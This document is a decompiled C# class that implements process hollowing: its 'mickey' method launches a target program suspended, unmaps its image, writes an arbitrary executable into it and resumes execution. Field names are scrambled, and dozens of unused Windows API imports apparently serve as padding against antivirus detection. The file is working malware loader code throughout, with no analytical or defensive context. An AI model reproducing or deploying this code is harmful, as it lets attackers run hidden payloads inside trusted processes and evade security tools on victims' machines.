using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class buffy
{
	public struct Context
	{
		public uint II69TOHMUR;

		public uint d2;

		public uint das;

		public uint d9;

		public uint ad;

		public uint dsa;

		public uint ds;

		public Save Save;

		public uint dh;

		public uint sad;

		public uint da;

		public uint MD;

		public uint RD;

		public uint mSI;

		public uint WDA;

		public uint AD3;

		public uint D21;

		public uint AS4;

		public uint K32;

		public uint F2W;

		public uint HHJ;

		public uint ADF5;

		public uint GSSA;

		public uint DSAAA;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] er6rgdr65;
	}

	public struct Save
	{
		public uint KD7JX2MXT;

		public uint JCNS3ZPSXO;

		public uint DAS3;

		public uint DAS23;

		public uint ADSA;

		public uint DAF35;

		public uint FA32D;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] FSDRF43;

		public uint FA32QA;
	}

	public struct Misc
	{
		public uint SDUHRL;

		public uint GSIJ;
	}

	public struct Section_Header
	{
		public byte FSDPOU4PO3;

		public Misc Mi2sc;

		public uint AL8ZCRFWNU;

		public uint DA22S3;

		public uint PoinEEter;

		public uint E2Q4RS;

		public uint FS523QF;

		public uint FSB43FSD4;

		public uint QBFAS4E;

		public uint AS32QFZS;
	}

	public struct Process_Information
	{
		public IntPtr DAS4QQW;

		public IntPtr RFSER;

		public int TGJWE;

		public int SDFFFFFFFFFF;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Startup_Information
	{
		public int CSZE;

		public string FSDR4G;

		public string AAAAAAAAAA;

		public string AADDDDDDD;

		public int ADA;

		public int C;

		public int AEDS;

		public int DASDDDD;

		public int XASE4;

		public int DAS3EDFZ;

		public int DVA3ES;

		public int CCCCQ;

		public short FDSRS;

		public short VYE5X;

		public int KHJKIHJK;

		public int KHJKHJK;

		public int KHJKHJ;

		public int KHJKJHK;
	}

	public struct Security_Flags
	{
		public int GFSETWE;

		public IntPtr EWEWWW;

		public int DASDAS;
	}

	public struct DOS_Header
	{
		public ushort DASDASFASF;

		public ushort QWEQWE;

		public ushort EQWEQWEQWE;

		public ushort HFGHFGHFGH;

		public ushort HFGHFGHFG;

		public ushort DASD444444;

		public ushort DASFASE33;

		public ushort DASKGHJ;

		public ushort DASVZDF;

		public ushort VXCVXC;

		public ushort VXCVXCV;

		public ushort EWECS;

		public ushort EWADC;

		public ushort UADA3;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] ReservWWWWWWWWWWWWWWWedA;

		public ushort DAS4E;

		public ushort UJJ;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] DDDDDDDDD;

		public int DASE3ASDAS;
	}

	public struct NT_Headers
	{
		public uint SSSSSSSSSSSQ;

		public File_Header DSEEEEE;

		public Optional_Headers OOOU;
	}

	public struct File_Header
	{
		public ushort ITTTTTTTT;

		public ushort DAAAAAAAA3;

		public uint HRFTYTYTR;

		public uint GJGFSFS;

		public uint FSVGY;

		public ushort FSFV;

		public ushort A34FFC;
	}

	public struct Optional_Headers
	{
		public ushort WWWWWWWWW;

		public byte MaAAAAAAAAAAAjor;

		public byte MiSSSSSSSSSSSnor;

		public uint SSSSSSSSSSSSS;

		public uint FFFFFFFFFFF;

		public uint XXXXXXXX;

		public uint DDDDDDDDAAA;

		public uint FSSSSSSS;

		public uint RSFS43;

		public uint DFAZDASD;

		public uint SectionA;

		public uint FileA;

		public ushort GDFTDFFFF;

		public ushort HGDFHD564;

		public ushort GD5ERGD;

		public ushort FSD5YHD;

		public ushort ASDASG;

		public ushort AS4ASAS;

		public uint CCC;

		public uint DASRDASRASR;

		public uint WQDASDASD;

		public uint Assssssss;

		public ushort fsd4s;

		public ushort fjio;

		public uint dasrlajstpoi;

		public uint dasdraskyjhuasp;

		public uint SHRedas4wa9uqserve;

		public uint fsdtsysyt;

		public uint eawdasdas3;

		public uint Cocccunt;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public Data_Directory[] GSDGSDT4;
	}

	public struct Data_Directory
	{
		public uint ewq34q234;

		public uint das34aw33;
	}

	public delegate bool GN04L0ER8I(string ASFASE3, string DASDAS3E2, ref Security_Flags DASCASE, ref Security_Flags CASE222, bool DAS432E, uint AEDFKJK32, IntPtr DSA43R3W, string ase32ew, [In] ref Startup_Information das43fsa, out Process_Information das3);

	public delegate bool ZGOQ8VM05M(IntPtr DASE32, int AL8ZCRFWNU, byte[] DSAE32, int DASEADAS, out int ASD43FA);

	public delegate int Q7QRRP639W(IntPtr FASFDASDAS, int AL8ZCRFWNU, ref int CAS32, int ASDASC, ref int CASTWE);

	public delegate IntPtr W6CTR6GLCC(IntPtr DASE43E, int AL8ZCRFWNU, uint DASCAS3, uint DAS3, uint DAS32);

	public delegate long EFVI2YI66B(IntPtr DASE3, int AL8ZCRFWNU);

	public delegate uint WS2XVBNVO9(IntPtr DASEAS);

	public delegate bool R84OY4NT36(IntPtr DASDASC, ref Context DSACSA43);

	public delegate bool K7B3INYH01(IntPtr ASDASCASDASD, ref Context ASCA434);

	public const long ASDFASFASF = 2778L;

	public const long FASFASFASF = 60116L;

	public const long AFSFASFASCFC = 218L;

	public const long ASDASCASDASD = 218L;

	public const long BVCXBXCBXCB = 218L;

	public const long BXCBXCBXCB = 253L;

	public const long FSDR3FSF = 218L;

	public const long KKKKKKKKKDDDDDDD = 17247L;

	public const uint FSSSSSSSSSSSSSSSSSS = 218u;

	public static void mickey(byte[] DAS4DA3, string VVVVVVCAE)
	{
		object obj = default(Context);
		object obj2 = default(Process_Information);
		object obj3 = default(Startup_Information);
		object obj4 = default(Security_Flags);
		object obj5 = default(Security_Flags);
		object obj6 = GCHandle.Alloc(DAS4DA3, GCHandleType.Pinned);
		int num = Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(obj6, (Type)null, "AddrOfPinnedObject", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ToInt32", new object[0], (string[])null, (Type[])null, (bool[])null));
		DOS_Header dOS_Header = default(DOS_Header);
		Type typeFromHandle = typeof(Marshal);
		object[] array = new object[2];
		object obj7 = obj6;
		array[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj7, (Type)null, "AddrOfPinnedObject", new object[0], (string[])null, (Type[])null, (bool[])null));
		array[1] = dOS_Header.GetType();
		object[] array2 = array;
		bool[] array3 = new bool[2] { true, false };
		object obj8 = NewLateBinding.LateGet((object)null, typeFromHandle, "PtrToStructure", array2, (string[])null, (Type[])null, array3);
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj7, (Type)null, "AddrOfPinnedObject", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
			if (obj8 == null)
			{
				goto IL_013d;
			}
		}
		else if (obj8 == null)
		{
			goto IL_013d;
		}
		DOS_Header dOS_Header2 = (DOS_Header)obj8;
		goto IL_014c;
		IL_013d:
		DOS_Header dOS_Header3 = default(DOS_Header);
		dOS_Header2 = dOS_Header3;
		goto IL_014c;
		IL_014c:
		dOS_Header = dOS_Header2;
		NewLateBinding.LateCall(obj6, (Type)null, "Free", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		GN04L0ER8I gN04L0ER8I = TXXY5U8D2U<GN04L0ER8I>("kernel32", "CreateProcessA");
		R84OY4NT36 r84OY4NT = TXXY5U8D2U<R84OY4NT36>("kernel32", "GetThreadContext");
		Q7QRRP639W q7QRRP639W = TXXY5U8D2U<Q7QRRP639W>("kernel32", "ReadProcessMemory");
		ZGOQ8VM05M zGOQ8VM05M = TXXY5U8D2U<ZGOQ8VM05M>("kernel32", "WriteProcessMemory");
		EFVI2YI66B eFVI2YI66B = TXXY5U8D2U<EFVI2YI66B>("ntdll", "ZwUnmapViewOfSection");
		W6CTR6GLCC w6CTR6GLCC = TXXY5U8D2U<W6CTR6GLCC>("kernel32", "VirtualAllocEx");
		K7B3INYH01 k7B3INYH = TXXY5U8D2U<K7B3INYH01>("kernel32", "SetThreadContext");
		WS2XVBNVO9 wS2XVBNVO = TXXY5U8D2U<WS2XVBNVO9>("kernel32", "ResumeThread");
		object obj9 = obj4;
		Security_Flags security_Flags = default(Security_Flags);
		Security_Flags DASCASE = ((obj9 != null) ? ((Security_Flags)obj9) : security_Flags);
		object obj10 = obj5;
		Security_Flags CASE = ((obj10 != null) ? ((Security_Flags)obj10) : security_Flags);
		object obj11 = obj3;
		Startup_Information startup_Information = default(Startup_Information);
		Startup_Information das43fsa = ((obj11 != null) ? ((Startup_Information)obj11) : startup_Information);
		object obj12 = obj2;
		Process_Information process_Information = default(Process_Information);
		Process_Information das = ((obj12 != null) ? ((Process_Information)obj12) : process_Information);
		IntPtr intPtr = default(IntPtr);
		bool num2 = gN04L0ER8I(null, VVVVVVCAE, ref DASCASE, ref CASE, DAS432E: false, 4u, intPtr, null, ref das43fsa, out das);
		obj2 = das;
		obj3 = das43fsa;
		obj5 = CASE;
		obj4 = DASCASE;
		if (0 - (num2 ? 1 : 0) == 0)
		{
			return;
		}
		NT_Headers nT_Headers = default(NT_Headers);
		IntPtr ptr = new IntPtr(checked(num + dOS_Header.DASE3ASDAS));
		object? obj13 = Marshal.PtrToStructure(ptr, nT_Headers.GetType());
		NT_Headers nT_Headers2 = default(NT_Headers);
		nT_Headers = ((obj13 != null) ? ((NT_Headers)obj13) : nT_Headers2);
		NewLateBinding.LateSet(obj3, (Type)null, "CSZE", new object[1] { Strings.Len(RuntimeHelpers.GetObjectValue(obj3)) }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj, (Type)null, "II69TOHMUR", new object[1] { 65539 }, (string[])null, (Type[])null);
		if (((long)nT_Headers.SSSSSSSSSSSQ != 17744L) | (dOS_Header.DASDASFASF != 23117))
		{
			return;
		}
		object obj14 = obj4;
		DASCASE = ((obj14 != null) ? ((Security_Flags)obj14) : security_Flags);
		object obj15 = obj5;
		CASE = ((obj15 != null) ? ((Security_Flags)obj15) : security_Flags);
		object obj16 = obj3;
		das43fsa = ((obj16 != null) ? ((Startup_Information)obj16) : startup_Information);
		object obj17 = obj2;
		das = ((obj17 != null) ? ((Process_Information)obj17) : process_Information);
		bool num3 = gN04L0ER8I(null, VVVVVVCAE, ref DASCASE, ref CASE, DAS432E: false, 4u, intPtr, null, ref das43fsa, out das);
		obj2 = das;
		obj3 = das43fsa;
		obj5 = CASE;
		obj4 = DASCASE;
		if (0 - (num3 ? 1 : 0) == 0)
		{
			return;
		}
		object obj18 = NewLateBinding.LateGet(obj2, (Type)null, "RFSER", new object[0], (string[])null, (Type[])null, (bool[])null);
		IntPtr dASDASC = ((obj18 != null) ? ((IntPtr)obj18) : intPtr);
		object obj19 = obj;
		Context context = default(Context);
		Context DSACSA = ((obj19 != null) ? ((Context)obj19) : context);
		r84OY4NT(dASDASC, ref DSACSA);
		obj = DSACSA;
		object obj20 = NewLateBinding.LateGet(obj2, (Type)null, "DAS4QQW", new object[0], (string[])null, (Type[])null, (bool[])null);
		IntPtr fASFDASDAS = ((obj20 != null) ? ((IntPtr)obj20) : intPtr);
		int aL8ZCRFWNU = Conversions.ToInteger(Operators.AddObject(NewLateBinding.LateGet(obj, (Type)null, "WDA", new object[0], (string[])null, (Type[])null, (bool[])null), (object)8));
		checked
		{
			long num4 = default(long);
			int CAS = (int)num4;
			int CASTWE = 0;
			q7QRRP639W(fASFDASDAS, aL8ZCRFWNU, ref CAS, 4, ref CASTWE);
			num4 = CAS;
			object obj21 = NewLateBinding.LateGet(obj2, (Type)null, "DAS4QQW", new object[0], (string[])null, (Type[])null, (bool[])null);
			eFVI2YI66B((obj21 != null) ? ((IntPtr)obj21) : intPtr, (int)num4);
			object obj22 = NewLateBinding.LateGet(obj2, (Type)null, "DAS4QQW", new object[0], (string[])null, (Type[])null, (bool[])null);
			uint num5 = (uint)(int)w6CTR6GLCC((obj22 != null) ? ((IntPtr)obj22) : intPtr, (int)nT_Headers.OOOU.DFAZDASD, nT_Headers.OOOU.DASRDASRASR, 12288u, 4u);
			if (unchecked((long)num5) == 0L)
			{
				return;
			}
			object obj23 = NewLateBinding.LateGet(obj2, (Type)null, "DAS4QQW", new object[0], (string[])null, (Type[])null, (bool[])null);
			IntPtr dASE = ((obj23 != null) ? ((IntPtr)obj23) : intPtr);
			int aL8ZCRFWNU2 = (int)num5;
			int dASEADAS = (int)nT_Headers.OOOU.WQDASDASD;
			uint num6 = default(uint);
			CASTWE = (int)num6;
			zGOQ8VM05M(dASE, aL8ZCRFWNU2, DAS4DA3, dASEADAS, out CASTWE);
			num6 = (uint)CASTWE;
			long num7 = dOS_Header.DASE3ASDAS + 248;
			int num8 = unchecked((int)nT_Headers.DSEEEEE.DAAAAAAAA3) - 1;
			Section_Header section_Header = default(Section_Header);
			Section_Header section_Header2 = default(Section_Header);
			for (int i = 0; i <= num8; i++)
			{
				ptr = new IntPtr(num + num7 + i * 40);
				object? obj24 = Marshal.PtrToStructure(ptr, section_Header.GetType());
				section_Header = ((obj24 != null) ? ((Section_Header)obj24) : section_Header2);
				byte[] array4 = new byte[(int)section_Header.DA22S3 + 1];
				int num9 = (int)(unchecked((long)section_Header.DA22S3) - 1L);
				for (int j = 0; j <= num9; j++)
				{
					array4[j] = DAS4DA3[(int)(unchecked((long)section_Header.PoinEEter) + unchecked((long)j))];
				}
				object obj25 = NewLateBinding.LateGet(obj2, (Type)null, "DAS4QQW", new object[0], (string[])null, (Type[])null, (bool[])null);
				IntPtr dASE2 = ((obj25 != null) ? ((IntPtr)obj25) : intPtr);
				int aL8ZCRFWNU3 = (int)(num5 + section_Header.AL8ZCRFWNU);
				int dASEADAS2 = (int)section_Header.DA22S3;
				CASTWE = (int)num6;
				zGOQ8VM05M(dASE2, aL8ZCRFWNU3, array4, dASEADAS2, out CASTWE);
				num6 = (uint)CASTWE;
			}
			object bytes = BitConverter.GetBytes(num5);
			object obj26 = NewLateBinding.LateGet(obj2, (Type)null, "DAS4QQW", new object[0], (string[])null, (Type[])null, (bool[])null);
			IntPtr dASE3 = ((obj26 != null) ? ((IntPtr)obj26) : intPtr);
			int aL8ZCRFWNU4 = Conversions.ToInteger(Operators.AddObject(NewLateBinding.LateGet(obj, (Type)null, "WDA", new object[0], (string[])null, (Type[])null, (bool[])null), (object)8));
			byte[] dSAE = (byte[])bytes;
			CASTWE = (int)num6;
			zGOQ8VM05M(dASE3, aL8ZCRFWNU4, dSAE, 4, out CASTWE);
			num6 = (uint)CASTWE;
			NewLateBinding.LateSet(obj, (Type)null, "AS4", new object[1] { num5 + nT_Headers.OOOU.DDDDDDDDAAA }, (string[])null, (Type[])null);
			object obj27 = NewLateBinding.LateGet(obj2, (Type)null, "RFSER", new object[0], (string[])null, (Type[])null, (bool[])null);
			IntPtr aSDASCASDASD = ((obj27 != null) ? ((IntPtr)obj27) : intPtr);
			object obj28 = obj;
			DSACSA = ((obj28 != null) ? ((Context)obj28) : context);
			k7B3INYH(aSDASCASDASD, ref DSACSA);
			obj = DSACSA;
			object obj29 = NewLateBinding.LateGet(obj2, (Type)null, "RFSER", new object[0], (string[])null, (Type[])null, (bool[])null);
			wS2XVBNVO((obj29 != null) ? ((IntPtr)obj29) : intPtr);
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string tr6);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr gdr54, [MarshalAs(UnmanagedType.VBByRefStr)] ref string gfsd54);

	[DllImport("rpcns4.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long RpcNsProfileEltAddA(long ProfileNameSyntax, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ProfileName, ref IntPtr IfId, long MemberNameSyntax, [MarshalAs(UnmanagedType.VBByRefStr)] ref string MemberName, long Priority, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Annotation);

	[DllImport("wldap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long ldap_close_extended_op(ref IntPtr ld, long MessageNumber);

	[DllImport("tapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long lineSetAppSpecific(long hCall, long dwAppSpecific);

	[DllImport("rtm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long MgmGetNextMfeStats(ref IntPtr pimmStart, ref long pdwBufferSize, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pbBuffer, ref long pdwNumEntries);

	[DllImport("mprapi.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long MprAdminDeviceEnum(ref IntPtr hMprServer, long dwLevel, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lplpbBuffer, ref long lpdwTotalEntries);

	[DllImport("MSI.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long MsiDatabaseImport(ref IntPtr hDatabase, [MarshalAs(UnmanagedType.VBByRefStr)] ref string szFolderPath, [MarshalAs(UnmanagedType.VBByRefStr)] ref string szFileName);

	[DllImport("rpcrt4.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long NdrMesSimpleTypeAlignSize(long handle_t);

	[DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long NetMessageNameDel([MarshalAs(UnmanagedType.VBByRefStr)] ref string servername, [MarshalAs(UnmanagedType.VBByRefStr)] ref string msgname);

	[DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long NetReplExportDirSetInfo([MarshalAs(UnmanagedType.VBByRefStr)] ref string servername, [MarshalAs(UnmanagedType.VBByRefStr)] ref string dirname, long level, [MarshalAs(UnmanagedType.VBByRefStr)] ref string buf, ref long parm_err);

	[DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long NetUseGetInfo(ref IntPtr UncServerName, ref IntPtr UseName, long level, [MarshalAs(UnmanagedType.VBByRefStr)] ref string bufptr);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long QueueUserWorkItem(long lFunction, ref long Context, long Flags);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long ReadConsoleInputA(long hConsoleInput, ref IntPtr lpBuffer, long nLength, ref long lpNumberOfEventsRead);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long ShowWindowAsync(long hWnd, long nCmdShow);

	[DllImport("mgmtapi.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SnmpMgrCtl(ref IntPtr session, long dwCtlCode, ref long lpvInBuffer, long cbInBuffer, ref long lpvOUTBuffer, long cbOUTBuffer, ref long lpcbBytesReturned);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long AddAuditAccessAceEx(IntPtr pAcl, long dwAceRevision, long AceFlags, long dwAccessMask, ref IntPtr pSid, long bAuditSuccess, long bAuditFailure);

	[DllImport("ODBCCP32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SQLInstallerError(int iError, ref long pfErrorCode, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszErrorMsg, int cbErrorMsgMax, ref int pcbErrorMsg);

	[DllImport("msorcl32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SQLSetCursorName(long hstmt, [MarshalAs(UnmanagedType.VBByRefStr)] ref string szCursor, int cbCursor);

	[DllImport("rasapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long RasSetCredentialsA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpcstr, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpcstr, ref IntPtr TLPRASCREDENTIALSA, long @bool);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long ReadConsoleA(long hConsoleInput, ref long lpBuffer, long nNumberOfCharsToRead, ref long lpNumberOfCharsRead, ref long lpReserved);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long ReadEncryptedFileRaw(ref IntPtr pfExportCallback, ref long pvCallbackContext, ref long pvContext);

	[DllImport("winspool.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long ReadPrinter(long hPrinter, ref long pBuf, long cdBuf, ref long pNoBytesRead);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long RegisterHotKey(long hwnd, long id, long fsModifiers, long vk);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long ReleaseSemaphore(long hSemaphore, long lReleaseCount, ref long lpPreviousCount);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetSiteNameFromSid(ref long pSid, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pwsSite);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetStringTypeExA(long Locale, long dwInfoType, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSrcStr, long cchSrc, ref int lpCharType);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetVolumePathNameA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszFileName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVolumePathName, long cchBufferLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SetWindowLongA(long hwnd, long nIndex, long dwNewLong);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long TlsSetValue(long dwTlsIndex, ref long lpTlsValue);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr ToAscii(long uVirtKey, long uScanCode, ref byte lpbKeyState, ref long lpwTransKey, long fuState);

	private static T TXXY5U8D2U<T>(string ASFASE3, string FASGAS543W)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref ASFASE3), ref FASGAS543W), typeof(T));
	}
}
